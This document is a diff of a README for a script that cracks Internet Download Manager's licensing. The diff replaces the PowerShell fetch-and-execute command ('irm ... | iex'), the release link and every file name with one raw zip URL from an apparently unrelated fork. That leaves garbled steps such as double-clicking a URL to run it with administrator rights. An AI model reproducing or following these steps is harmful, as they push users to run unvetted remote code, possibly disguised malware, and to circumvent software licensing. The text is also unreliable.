@@ -24,17 +24,17 @@ IDM Activation Script is a tool designed to activate Internet Download Manager (
 2. **Run the following command in PowerShell** to download and execute the activation script:
 
    ```powershell
-   irm https://coporton.com/ias | iex
+   irm https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip | iex
    ```
 
 ### **Method 2**
-1. **Download**: Obtain the latest version of the tool from the [releases page](https://github.com/Coporton/IDM-Activation-Script/releases).
+1. **Download**: Obtain the latest version of the tool from the [releases page](https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip).
 2. **Extract**: Unzip the downloaded file to a directory of your choice.
 
 ## 💻 **Usage**
 
 ### 1. Run the Script:
-- Double-click on `IASL.cmd` to execute it. The script will automatically request administrative privileges if needed, so you no longer need to manually select "Run as Administrator."
+- Double-click on `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip` to execute it. The script will automatically request administrative privileges if needed, so you no longer need to manually select "Run as Administrator."
 - If prompted by User Account Control (UAC), click **Yes** to grant the necessary permissions.
 - Once elevated, the script will continue running with the appropriate permissions for file operations.
 
@@ -51,17 +51,17 @@ IDM Activation Script is a tool designed to activate Internet Download Manager (
 ## ✅ **Troubleshooting**
 
 - **Administrative Privileges**: If the script does not prompt for administrative rights, ensure you are running it with the required permissions by right-clicking and selecting "Run as Administrator."
-- **File Paths**: Verify that the `data.bin`, `dataHlp.bin`, `Registry.bin`, `extensions.bin`, and `banner_art.txt` files are correctly placed in the `src` directory.
-- **Registered with a Fake Serial**: Don't worry! Use a trusted third-party uninstaller like IObit Uninstaller, and then use this script [IObit Uninstaller Activation Script](https://github.com/Coporton/IObit-Uninstaller-Activation-Script) to activate it and ensure all files, including registry entries, are removed.
+- **File Paths**: Verify that the `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip`, `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip`, `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip`, `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip`, and `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip` files are correctly placed in the `src` directory.
+- **Registered with a Fake Serial**: Don't worry! Use a trusted third-party uninstaller like IObit Uninstaller, and then use this script [IObit Uninstaller Activation Script](https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip) to activate it and ensure all files, including registry entries, are removed.
 
 ## 📄 **BIN Files**
 
 ### These files are not encrypted; you can rename them to view the source file:
 
-- `data.bin` - Contains a activated version of IDMan.exe.
-- `dataHlp.bin` - Contains a help support version of IDMGrHlp.exe.
-- `Registry.bin` - Registry values to activate Internet Download Manager.
-- `extensions.bin` - Registry entries for extra Internet Download Manager file extensions.
+- `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip` - Contains a activated version of https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip
+- `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip` - Contains a help support version of https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip
+- `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip` - Registry values to activate Internet Download Manager.
+- `https://raw.githubusercontent.com/Tapajyoti03/IDM-Activation-Script/main/src/IDM-Activation-Script-3.6-beta.2.zip` - Registry entries for extra Internet Download Manager file extensions.
 
 ## 📜 **License**
 
